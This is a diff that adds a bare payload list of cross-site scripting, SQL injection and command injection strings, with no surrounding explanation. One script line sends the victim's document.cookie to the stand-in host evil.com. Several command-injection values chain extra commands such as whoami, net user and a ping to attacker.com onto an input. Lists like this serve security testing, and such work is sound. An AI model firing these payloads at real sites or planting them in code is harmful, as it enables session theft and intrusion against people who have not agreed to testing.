@@ -1,0 +1,18 @@
+--- XSS PAYLOADS ---
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+javascript:document.location='http://evil.com?c='+document.cookie
+<svg/onload=alert(1)>
+<script\u0000>alert(1)</script>
+<div onclick=alert(1)>Click</div>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+--- SQLi PAYLOADS ---
+' OR 1=1 --
+' UNION SELECT NULL, NULL --
+' AND 1=1 WAITFOR DELAY '0:0:5' --
+
+--- Command Injection PAYLOADS ---
+&& whoami
+&& net user
+; ping -c 4 attacker.com
